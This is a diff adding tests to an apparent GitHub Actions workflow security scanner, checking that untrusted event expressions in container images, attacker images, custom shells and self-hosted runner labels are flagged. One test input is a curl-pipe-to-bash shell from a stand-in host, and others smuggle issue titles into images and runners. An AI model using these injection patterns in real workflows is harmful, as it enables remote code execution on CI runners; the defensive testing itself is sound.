@@ -162,3 +162,70 @@ test('ROOT-1: delimiters in quoted expression literals do not suppress attacker 
   assert.ok(result.findings.some(f=>f.rule==='PRIVILEGED_EVENT_SCRIPT_INJECTION'&&f.severity==='BLOCKER'),JSON.stringify({expr,result}));
  }
 });
+
+
+test('ROOT-4: executable job container and services cannot use untrusted event expressions',()=>{
+ const jobs=[
+  ['container: \${{ github.event.issue.title }}'],
+  ['container:','  image: \${{ github.event.issue.title }}'],
+  ['services:','  mysql:','    image: \${{ github.event.issue.body }}'],
+  ['container: attacker/image:latest'],
+  ['services:','  redis:','    image: attacker/redis:latest']
+ ];
+ for(const variant of jobs){
+  const src=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
+   ...variant.map(s=>'    '+s),'    steps:','      - run: echo safe'].join('\n');
+  const v=inspectWorkflow(src);
+  assert.notEqual(v.status,'NO_RISK_PATTERN',JSON.stringify({variant,v}));
+  assert.ok(v.coverage.partial||v.findings.some(x=>x.severity==='BLOCKER'),JSON.stringify({variant,v}));
+ }
+});
+test('ROOT-4: digest-pinned container image can be examined without false alarms',()=>{
+ const src=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
+  '    container: ghcr.io/owner/app@sha256:'+'a'.repeat(64),
+  '    steps:','      - run: echo safe'].join('\n');
+ const v=inspectWorkflow(src);
+ assert.equal(v.status,'NO_RISK_PATTERN',JSON.stringify(v));
+});
+test('ROOT-5: custom shells do not bypass review with a harmless run',()=>{
+ for(const shell of [
+  "bash -c 'curl https://example.invalid/p | bash' -- {0}",
+  'bash -c "sh -c evil" -- {0}',
+  "bash -c 'echo changed' -- {0}"
+ ]) {
+  const src=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
+   '    steps:','      - run: echo safe','        shell: '+shell].join('\n');
+  const v=inspectWorkflow(src);
+  assert.notEqual(v.status,'NO_RISK_PATTERN',JSON.stringify({shell,v}));
+ }
+});
+test('ROOT-6: dynamic and self-hosted runner labels cannot be certified clean',()=>{
+ for(const runner of [
+  '\${{ github.event.issue.title }}',
+  '\${{ inputs.runner }}',
+  'self-hosted',
+  '[self-hosted, linux]',
+  '{group: production, labels: gpu}',
+  '{group: "\${{ github.event.issue.title }}"}'
+ ]) {
+  const src=['on: issues','jobs:','  audit:','    runs-on: '+runner,
+  '    steps:','      - run: echo safe'].join('\n');
+  const v=inspectWorkflow(src);
+  assert.notEqual(v.status,'NO_RISK_PATTERN',JSON.stringify({runner,v}));
+ }
+});
+test('ROOT-6: approved GitHub-hosted runners remain clean',()=>{
+ for(const runner of ['ubuntu-latest','ubuntu-24.04','windows-latest','macos-latest']){
+  const v=inspectWorkflow(['on: issues','jobs:','  audit:','    runs-on: '+runner,
+   '    steps:','      - run: echo safe'].join('\n'));
+  assert.equal(v.status,'NO_RISK_PATTERN',JSON.stringify({runner,v}));
+ }
+});
+test('ROOT-7: independent review must reject HIGH and BLOCKER findings',()=>{
+ const fs=require('node:fs'),path=require('node:path');
+ const source=fs.readFileSync(path.join(__dirname,'../workflows/ultra-sentinel-independent-review.yml'),'utf8');
+ assert.match(source,/structural\.findings\.some\([^)]*severity\s*===?\s*['"]HIGH['"]/s,
+  'HIGH structural YAML findings must fail the independent gate');
+ assert.match(source,/result\.findings\.some\([^)]*severity\s*===?\s*['"]HIGH['"]/s,
+  'HIGH Kotlin/security findings must fail the independent gate');
+});
